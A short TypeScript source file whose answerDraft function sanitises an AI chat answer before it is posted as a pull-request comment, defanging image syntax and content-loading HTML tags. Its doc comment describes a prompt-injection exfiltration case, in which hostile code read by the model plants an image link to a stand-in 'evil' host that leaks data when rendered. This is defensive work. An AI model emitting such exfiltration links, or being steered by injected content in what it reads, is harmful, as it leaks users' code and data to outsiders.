/**
 * `answerDraft`: an AI answer made safe to post as a comment ("Use as comment
 * / reply" in the side-panel chat).
 */

/** Markdown image syntax, inline or reference style: `![alt](url)`, `![alt][ref]`. */
const IMAGE_RE = /!\[/g
/**
 * The `<` of an HTML comment or of a tag that loads something by itself.
 * Lookahead over one character class: linear on any input.
 */
const LOADING_HTML_RE =
  /<(?=!--|[\s/]*(?:img|image|picture|source|video|audio|track|iframe|frame|object|embed|svg|input|link|meta|base|style|script|form)\b)/gi

/**
 * An AI answer as a comment draft ("Use as comment / reply"). The chat shows
 * answers without images (`Markdown images={false}`): the model reads hostile
 * code, and an injected `![x](https://evil/?d=…)` would send what it read to
 * anyone. Posted, the provider WOULD load it for everyone who opens the PR,
 * so the draft never carries one: image syntax becomes a plain link (nothing
 * loads until someone clicks it), and HTML comments (hidden text) and tags
 * that load things (`<img>`, `<video>`…) are escaped so they show as text.
 * The whole text is treated alike, code included: telling code apart the way
 * each provider does is where a bypass would hide.
 */
export function answerDraft(markdown: string): string {
  return markdown.replace(IMAGE_RE, '[').replace(LOADING_HTML_RE, '&lt;')
}
